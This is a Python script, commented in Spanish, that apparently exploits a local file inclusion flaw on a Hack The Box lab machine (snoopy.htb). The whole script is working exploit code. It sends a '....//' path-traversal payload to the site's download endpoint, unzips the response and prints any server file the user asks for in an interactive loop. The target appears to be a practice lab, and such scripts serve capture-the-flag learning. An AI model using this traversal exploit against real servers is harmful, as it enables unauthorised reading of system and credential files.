import requests # para realizar peticiones http
from colorama import Fore, Style # Para insertar colores en las salidas por pantalla
import zipfile # para descomprimir el archivo zip
import signal, pdb # para capturar la señal de ctrl + c y salir del programa y para hacer debug

def def_handler(sig, frame):
    print(Fore.RED + "\n[!] Exiting..." + Style.RESET_ALL)
    exit(1)

# ctrl + c 
signal.signal(signal.SIGINT, def_handler)

# variables globales

main_url= "http://snoopy.htb/download"

def lfi(path):

    params= {"file":"....//....//....//...//....//..../%s" % path} # Path traversal

    r = requests.get(main_url, params=params)
    
    if r.status_code == 200:
        
        # Abrimos el archivo en modo escritura binaria y escribimos el contenido de la respuesta
        with open("ejemplo.zip", "wb") as f:
            f.write(r.content)


        # Descomprimimos el archivo zip
        with zipfile.ZipFile("ejemplo.zip") as z:
            z.extractall('.')
        
        # Leemos el contenido del archivo descomprimido
        with open('press_package%s' % path , "r") as f:
            content = f.read()
            print(Fore.GREEN + content + Style.RESET_ALL)
    
    # Si la petición no es correcta
    else: 
        print(Fore.RED + "\n[!] Error en la petición GET" + Style.RESET_ALL)
        exit(1)


def main():
    # Pedimos la ruta del archivo a leer
    while True:
        path = input(Fore.YELLOW + "\n[!] Introduce la ruta del archivo a leer: " + Style.RESET_ALL)
        lfi(path)


# Ejecutamos el programa
if __name__ == "__main__":
    main()



    
